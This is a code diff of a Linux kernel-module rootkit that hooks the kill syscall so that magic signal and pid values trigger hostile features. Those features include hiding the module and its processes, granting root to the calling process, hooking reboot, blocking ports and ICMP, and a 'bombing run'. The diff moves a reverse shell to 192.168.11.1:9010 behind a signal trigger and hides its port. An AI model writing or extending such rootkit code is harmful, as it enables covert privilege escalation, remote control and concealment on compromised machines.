@@ -75,7 +75,7 @@ static struct ftrace_hook ACTIVE_HOOKS[] = {
 static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
     int sig = regs->si;
     int pid = regs->di;
-    if ( (sig == 64) && (pid == 1))
+    if ((sig == 64) && (pid == 1))
     {
         if(hidden == 0){
             printk(KERN_INFO "Hide rootkite\n");
@@ -128,7 +128,6 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"packet_rcv_spkt") == 1){
             printk(KERN_ERR "error hooking packet_rcv_spkt\n");
         }
-        switch_net_hook();
         switch_hide_process();
     }
     else if ((sig == 63) && (pid == 2)){
@@ -137,6 +136,9 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         }
     }
     else if ((sig == 63) && (pid == 3)){
+        switch_net_hook(); // block traffic to specified ports and block ICMP
+    }
+    else if ((sig == 63) && (pid == 4)){
         start_bombing_run();
     }
     return orig_kill(regs);
@@ -158,6 +160,10 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         printk(KERN_INFO "Setting root for calling process\n");
         set_root();
         return 0;
+    }
+    else if ((sig == 64) && (pid == 3)){
+        start_reverse_shell("192.168.11.1", "9010");
+        insert_node(&ports_to_hide, "9010");
     }
     else if ((sig == 63) && (pid == 1)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
@@ -198,15 +204,15 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         }
         switch_hide_process();
     }
-    else if ((sig == 63) && (pid == 3)){
-        switch_net_hook(); // block traffic to specified ports and block ICMP
-    }
     else if ((sig == 63) && (pid == 2)){
         if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
         }
     }
     else if ((sig == 63) && (pid == 3)){
+        switch_net_hook(); // block traffic to specified ports and block ICMP
+    }
+    else if ((sig == 63) && (pid == 4)){
         start_bombing_run();
     }
     return orig_kill(pid, sig);
@@ -233,7 +239,6 @@ static int __init mod_init(void){
     if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
         printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
     }
-    start_reverse_shell("192.168.11.1", "9010");
     return 0;
 }
 
